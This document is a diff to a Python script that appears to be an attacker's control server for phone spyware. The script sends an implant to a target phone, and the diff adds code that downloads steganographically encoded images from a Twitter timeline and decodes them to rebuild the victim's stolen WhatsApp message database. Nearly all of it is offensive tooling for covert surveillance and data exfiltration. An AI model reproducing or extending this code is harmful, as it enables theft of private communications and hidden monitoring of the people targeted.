@@ -1,4 +1,4 @@
-import http.server, socket, sqlite3, tweepy, json, requests
+import http.server, socket, sqlite3, tweepy, json, requests, os, subprocess, time
 
 # uses port 12345, ensure later processes use a different port
 # TODO move the desired exploit file into this directory so it will be forwarded to the phone when GET request received
@@ -24,9 +24,6 @@ def send_implant(ip_address):
         count += 1
         conn.close() 
         print("Connection closed")
-
-def undo_steganography():
-    pass
 
 # Parses WhatsApp message database and stores the messages in a dictionary
 def decode_whatsapp_messages():
@@ -82,26 +79,44 @@ def fetch_tweets_and_download_encoded_images():
     auth.set_access_token(access_token, access_token_secret) 
     api = tweepy.API(auth) 
     list_of_photo_urls = list()
+
+    print("Searching Twitter timeline for encoded images sent from the phone")
     for j in range(0,100):
         try:
             tweet = json.loads(json.dumps(api.user_timeline()[j]._json))
             if "The toast is burnt" in str(tweet['text']):
                 photo_url = str(tweet['entities']['media'][0]['media_url'])
-                list_of_photo_urls.append(photo_url)
+                img_number = tweet['text'][19:20]
+                list_of_photo_urls.append((photo_url, img_number))
         except:
             break
 
-    print(list_of_photo_urls)
-    img_count = 0
+    os.mkdir("encoded_images")
+    os.chdir("encoded_images")
+    print("Found {} encoded images sent by the phone".format(len(list_of_photo_urls)))
     for photo_url in list_of_photo_urls:
-        photo_file = requests.get(photo_url, stream = True).content
-        filename = "encoded_img_{}.jpg".format(img_count)
-        print(filename)
+        print(photo_url[0])
+        photo_file = requests.get(photo_url[0], stream = True).content
+        filename = "encoded_img_{}.png".format(int(photo_url[1]))
         fd = open(filename, 'wb+')
         fd.write(photo_file)
         fd.close()
 
-        img_count += 1
+    print("All of the images have been saved in {}".format(os.getcwd()))
+    os.chdir("..")
+    time.sleep(5)
+
+# pieces the WhatsApp database back together from the encoded images
+def decode_images():
+    os.chdir("encoded_images")
+    list_of_images = list()
+    for file in os.listdir(os.getcwd()):
+        list_of_images.append(file)
+    list_of_images.sort() 
+    for file in list_of_images:
+        subprocess.run(["piss", "decode", file, str(file) + ".decoded"])
+        
+    
 
 # Command that sends out a datafile to the phone that will be used to encode the WhatsApp database
 def burn_the_toast():
@@ -119,6 +134,7 @@ if __name__ == "__main__":
     # send_implant(host)
     # butter_the_toast()
     # decode_whatsapp_messages()
-    # burn_the_toast()
     fetch_tweets_and_download_encoded_images()
-    # pass
+    decode_images()
+    # burn_the_toast()
+   
